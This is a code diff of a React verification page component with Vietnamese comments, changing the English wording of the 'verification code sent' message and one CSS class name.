@@ -55,31 +55,31 @@ const Verify = () => {
             if (savedTranslation) {
                 try {
                     const parsedTranslation = JSON.parse(savedTranslation);
-                    // 🎯 FIX: Loại bỏ ngắt dòng trong bản dịch
+                    // 🎯 FIX: Loại bỏ ngắt dòng và sửa thứ tự "của bạn"
                     const fixedTranslation = {
                         ...parsedTranslation,
-                        description: parsedTranslation.description?.replace(/\n/g, ' ').trim() || `We have sent a verification code to your ${actualEmail}, ${actualPhone}. Please enter the code we just sent to continue.`
+                        description: parsedTranslation.description?.replace(/\n/g, ' ').trim() || `We have sent a verification code to ${actualEmail}, ${actualPhone} of yours. Please enter the code we just sent to continue.`
                     };
                     setTranslatedTexts(fixedTranslation);
                 } catch {
                     // Nếu lỗi thì dùng tiếng Anh với data thật
                     setTranslatedTexts(prev => ({
                         ...prev,
-                        description: `We have sent a verification code to your ${actualEmail}, ${actualPhone}. Please enter the code we just sent to continue.`
+                        description: `We have sent a verification code to ${actualEmail}, ${actualPhone} of yours. Please enter the code we just sent to continue.`
                     }));
                 }
             } else {
                 // Nếu chưa có bản dịch thì dùng tiếng Anh với data thật
                 setTranslatedTexts(prev => ({
                     ...prev,
-                    description: `We have sent a verification code to your ${actualEmail}, ${actualPhone}. Please enter the code we just sent to continue.`
+                    description: `We have sent a verification code to ${actualEmail}, ${actualPhone} of yours. Please enter the code we just sent to continue.`
                 }));
             }
         } else {
-            // 🎯 TIẾNG ANH: DÙNG DATA THẬT
+            // 🎯 TIẾNG ANH: DÙNG DATA THẬT - ĐÃ SỬA THỨ TỰ
             setTranslatedTexts(prev => ({
                 ...prev,
-                description: `We have sent a verification code to your ${actualEmail}, ${actualPhone}. Please enter the code we just sent to continue.`
+                description: `We have sent a verification code to ${actualEmail}, ${actualPhone} of yours. Please enter the code we just sent to continue.`
             }));
         }
     }, []);
@@ -162,7 +162,7 @@ const Verify = () => {
                     {isLoading ? translatedTexts.loadingText + '...' : translatedTexts.submit}
                 </button>
 
-                <p className='cursor-pointer text-center text-blue-900 hover:underline'>{translatedTexts.sendCode}</p>
+                <p className='cursor-pointer text-center text-blue-900 hover-underline'>{translatedTexts.sendCode}</p>
             </div>
         </div>
     );
